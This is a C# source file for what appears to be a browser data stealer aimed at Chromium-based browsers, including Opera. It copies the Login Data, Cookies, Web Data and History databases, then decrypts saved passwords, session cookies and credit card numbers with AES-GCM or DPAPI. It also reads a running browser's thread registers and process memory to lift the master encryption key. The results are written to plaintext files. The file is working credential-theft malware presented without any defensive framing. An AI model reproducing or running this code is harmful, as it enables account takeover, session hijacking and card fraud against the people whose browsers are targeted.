using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Data.Sqlite;

namespace BrowserExtractorCS
{
    public static class Extractor
    {
        public static byte[] DecryptBlob(byte[] blob, AesGcm v10Cipher, AesGcm v20Cipher, bool isOpera)
        {
            if (blob == null || blob.Length < 15) return null;

            string prefix = Encoding.ASCII.GetString(blob, 0, 3);
            if (prefix == "v10" || prefix == "v11")
            {
                byte[] nonce = blob.Skip(3).Take(12).ToArray();
                byte[] ciphertext = blob.Skip(15).ToArray();
                byte[] tag = ciphertext.TakeLast(16).ToArray();
                byte[] actualCiphertext = ciphertext.SkipLast(16).ToArray();
                byte[] plaintext = new byte[actualCiphertext.Length];

                try
                {
                    if (v10Cipher != null)
                    {
                        v10Cipher.Decrypt(nonce, actualCiphertext, tag, plaintext);
                        if (isOpera && plaintext.Length > 32) return plaintext.Skip(32).ToArray();
                        return plaintext;
                    }
                }
                catch { }

                try
                {
                    if (v20Cipher != null)
                    {
                        v20Cipher.Decrypt(nonce, actualCiphertext, tag, plaintext);
                        if (isOpera && plaintext.Length > 32) return plaintext.Skip(32).ToArray();
                        return plaintext;
                    }
                }
                catch { }
            }
            else if (prefix == "v20")
            {
                byte[] nonce = blob.Skip(3).Take(12).ToArray();
                byte[] ciphertext = blob.Skip(15).ToArray();
                byte[] tag = ciphertext.TakeLast(16).ToArray();
                byte[] actualCiphertext = ciphertext.SkipLast(16).ToArray();
                byte[] plaintext = new byte[actualCiphertext.Length];

                try
                {
                    if (v20Cipher != null)
                    {
                        v20Cipher.Decrypt(nonce, actualCiphertext, tag, plaintext);
                        if (plaintext.Length > 32) return plaintext.Skip(32).ToArray();
                        return plaintext;
                    }
                }
                catch { }

                try
                {
                    if (v10Cipher != null)
                    {
                        v10Cipher.Decrypt(nonce, actualCiphertext, tag, plaintext);
                        if (plaintext.Length > 32) return plaintext.Skip(32).ToArray();
                        return plaintext;
                    }
                }
                catch { }
            }
            else
            {
                // DPAPI Fallback
                Win32.CRYPT_INTEGER_BLOB input = new Win32.CRYPT_INTEGER_BLOB();
                input.cbData = (uint)blob.Length;
                input.pbData = System.Runtime.InteropServices.Marshal.AllocHGlobal(blob.Length);
                System.Runtime.InteropServices.Marshal.Copy(blob, 0, input.pbData, blob.Length);

                try
                {
                    if (Win32.CryptUnprotectData(ref input, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, out Win32.CRYPT_INTEGER_BLOB output))
                    {
                        byte[] result = new byte[output.cbData];
                        System.Runtime.InteropServices.Marshal.Copy(output.pbData, result, 0, (int)output.cbData);
                        Win32.LocalFree(output.pbData);
                        return result;
                    }
                }
                catch { }
                finally
                {
                    System.Runtime.InteropServices.Marshal.FreeHGlobal(input.pbData);
                }
            }

            return null;
        }

        private static string CopyAndOpenDb(string dbPath, string prefix)
        {
            string tempDb = Path.Combine(Path.GetTempPath(), $"{prefix}_{Guid.NewGuid()}");
            try
            {
                File.Copy(dbPath, tempDb, true);
                return tempDb;
            }
            catch { return null; }
        }

        public static void ExtractPasswords(string profilePath, string outputDir, AesGcm v10Cipher, AesGcm v20Cipher, string tempPrefix, bool isOpera)
        {
            string dbPath = Path.Combine(profilePath, "Login Data");
            if (!File.Exists(dbPath)) return;

            string tempPath = CopyAndOpenDb(dbPath, tempPrefix);
            if (tempPath == null) return;

            try
            {
                using (var connection = new SqliteConnection($"Data Source={tempPath}"))
                {
                    connection.Open();
                    var command = connection.CreateCommand();
                    command.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                    using (var reader = command.ExecuteReader())
                    {
                        using (var writer = new StreamWriter(Path.Combine(outputDir, "passwords.txt")))
                        {
                            while (reader.Read())
                            {
                                string url = reader.GetString(0);
                                string user = reader.GetString(1);
                                byte[] blob = (byte[])reader[2];

                                byte[] decrypted = DecryptBlob(blob, v10Cipher, v20Cipher, isOpera);
                                if (decrypted != null)
                                {
                                    writer.WriteLine($"URL: {url}\nUser: {user}\nPass: {Encoding.UTF8.GetString(decrypted)}\n---");
                                }
                            }
                        }
                    }
                }
            }
            catch { }
            finally { File.Delete(tempPath); }
        }

        public static void ExtractCookies(string profilePath, string outputDir, AesGcm v10Cipher, AesGcm v20Cipher, string tempPrefix, bool isOpera)
        {
            string dbPath = Path.Combine(profilePath, "Network", "Cookies");
            if (!File.Exists(dbPath)) dbPath = Path.Combine(profilePath, "Cookies");
            if (!File.Exists(dbPath)) return;

            string tempPath = CopyAndOpenDb(dbPath, tempPrefix);
            if (tempPath == null) return;

            try
            {
                using (var connection = new SqliteConnection($"Data Source={tempPath}"))
                {
                    connection.Open();
                    var command = connection.CreateCommand();
                    command.CommandText = "SELECT host_key, name, value, encrypted_value FROM cookies";
                    using (var reader = command.ExecuteReader())
                    {
                        using (var writer = new StreamWriter(Path.Combine(outputDir, "cookies.txt")))
                        {
                            while (reader.Read())
                            {
                                string host = reader.GetString(0);
                                string name = reader.GetString(1);
                                string val = reader.GetString(2);
                                byte[] blob = (byte[])reader[3];

                                byte[] decrypted = DecryptBlob(blob, v10Cipher, v20Cipher, isOpera);
                                string cookieVal = decrypted != null ? Encoding.UTF8.GetString(decrypted) : (!string.IsNullOrEmpty(val) ? val : "");

                                if (!string.IsNullOrEmpty(cookieVal))
                                {
                                    writer.WriteLine($"Host: {host} | Name: {name} | Value: {cookieVal}");
                                }
                            }
                        }
                    }
                }
            }
            catch { }
            finally { File.Delete(tempPath); }
        }

        public static void ExtractAutofill(string profilePath, string outputDir, AesGcm v10Cipher, AesGcm v20Cipher, string tempPrefix, bool isOpera)
        {
            string dbPath = Path.Combine(profilePath, "Web Data");
            if (!File.Exists(dbPath)) return;

            string tempPath = CopyAndOpenDb(dbPath, tempPrefix);
            if (tempPath == null) return;

            try
            {
                using (var connection = new SqliteConnection($"Data Source={tempPath}"))
                {
                    connection.Open();
                    using (var writer = new StreamWriter(Path.Combine(outputDir, "autofill.txt")))
                    {
                        // Form History
                        try
                        {
                            var command = connection.CreateCommand();
                            command.CommandText = "SELECT name, value FROM autofill";
                            using (var reader = command.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    writer.WriteLine($"Form: {reader.GetString(0)} = {reader.GetString(1)}");
                                }
                            }
                        }
                        catch { }

                        // Profiles
                        string[] tables = { "autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones" };
                        foreach (var table in tables)
                        {
                            try
                            {
                                string col = table.Contains("name") ? "first_name" : (table.Contains("email") ? "email" : "number");
                                var command = connection.CreateCommand();
                                command.CommandText = $"SELECT guid, {col} FROM {table}";
                                using (var reader = command.ExecuteReader())
                                {
                                    while (reader.Read())
                                    {
                                        writer.WriteLine($"{table} ({reader.GetString(0)}): {reader.GetString(1)}");
                                    }
                                }
                            }
                            catch { }
                        }

                        // Credit Cards
                        try
                        {
                            var command = connection.CreateCommand();
                            command.CommandText = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards";
                            using (var reader = command.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    string name = reader.GetString(0);
                                    int m = reader.GetInt32(1);
                                    int y = reader.GetInt32(2);
                                    byte[] blob = (byte[])reader[3];

                                    byte[] decrypted = DecryptBlob(blob, v10Cipher, v20Cipher, isOpera);
                                    if (decrypted != null)
                                    {
                                        writer.WriteLine($"Card: {name} | Exp: {m}/{y} | Num: {Encoding.UTF8.GetString(decrypted)}");
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
            finally { File.Delete(tempPath); }
        }

        public static void ExtractHistory(string profilePath, string outputDir, string tempPrefix)
        {
            string dbPath = Path.Combine(profilePath, "History");
            if (!File.Exists(dbPath)) return;

            string tempPath = CopyAndOpenDb(dbPath, tempPrefix);
            if (tempPath == null) return;

            try
            {
                using (var connection = new SqliteConnection($"Data Source={tempPath}"))
                {
                    connection.Open();
                    var command = connection.CreateCommand();
                    command.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
                    using (var reader = command.ExecuteReader())
                    {
                        using (var writer = new StreamWriter(Path.Combine(outputDir, "history.txt")))
                        {
                            while (reader.Read())
                            {
                                writer.WriteLine($"URL: {reader.GetString(0)} | Title: {reader.GetString(1)} | Visits: {reader.GetInt32(2)}");
                            }
                        }
                    }
                }
            }
            catch { }
            finally { File.Delete(tempPath); }
        }

        public static void ExtractAllProfilesData(byte[] v20Key, BrowserConfig config, string userDataDir)
        {
            var v10KeyRes = Utils.GetV10Key(userDataDir);
            AesGcm v10Cipher = v10KeyRes != null ? new AesGcm(v10KeyRes.Value.key, 16) : null;
            AesGcm v20Cipher = v20Key != null ? new AesGcm(v20Key, 16) : null;

            var profiles = Utils.DiscoverProfiles(userDataDir);
            if (!Directory.Exists(config.OutputDir)) Directory.CreateDirectory(config.OutputDir);

            bool isOpera = config.Name.Contains("Opera");

            foreach (var profileName in profiles)
            {
                Console.WriteLine($"Extracting data for profile: {profileName}");
                string profilePath = Path.Combine(userDataDir, profileName);
                string outputDir = Path.Combine(config.OutputDir, profileName);
                if (!Directory.Exists(outputDir)) Directory.CreateDirectory(outputDir);

                ExtractPasswords(profilePath, outputDir, v10Cipher, v20Cipher, config.TempPrefix, isOpera);
                ExtractCookies(profilePath, outputDir, v10Cipher, v20Cipher, config.TempPrefix, isOpera);
                ExtractAutofill(profilePath, outputDir, v10Cipher, v20Cipher, config.TempPrefix, isOpera);
                ExtractHistory(profilePath, outputDir, config.TempPrefix);
            }

            Console.WriteLine($"Extraction complete. Data saved in {config.OutputDir} folder.");
        }

        public static bool ExtractKey(uint threadId, IntPtr hProcess, BrowserConfig config, string userDataDir)
        {
            IntPtr hThread = Win32.OpenThread(Win32.THREAD_GET_CONTEXT, false, threadId);
            if (hThread == IntPtr.Zero) return false;

            bool success = false;
            Win32.CONTEXT context = new Win32.CONTEXT();
            context.ContextFlags = Win32.CONTEXT_FULL;
            if (Win32.GetThreadContext(hThread, ref context))
            {
                ulong[] keyPtrs = config.UseR14 ? new[] { context.R14, context.R15 } : new[] { context.R15, context.R14 };
                foreach (ulong ptr in keyPtrs)
                {
                    if (ptr == 0) continue;
                    byte[] buffer = new byte[32];
                    if (Win32.ReadProcessMemory(hProcess, (IntPtr)ptr, buffer, buffer.Length, out _))
                    {
                        IntPtr dataPtr = (IntPtr)ptr;
                        ulong length = BitConverter.ToUInt64(buffer, 8);
                        if (length == 32)
                        {
                            dataPtr = (IntPtr)BitConverter.ToUInt64(buffer, 0);
                        }

                        byte[] key = new byte[32];
                        if (Win32.ReadProcessMemory(hProcess, dataPtr, key, key.Length, out _))
                        {
                            if (key.Any(b => b != 0))
                            {
                                Console.WriteLine($"Extracted Master Key from 0x{(long)dataPtr:X}");
                                ExtractAllProfilesData(key, config, userDataDir);
                                success = true;
                                break;
                            }
                        }
                    }
                }
            }

            Win32.CloseHandle(hThread);
            return success;
        }
    }
}
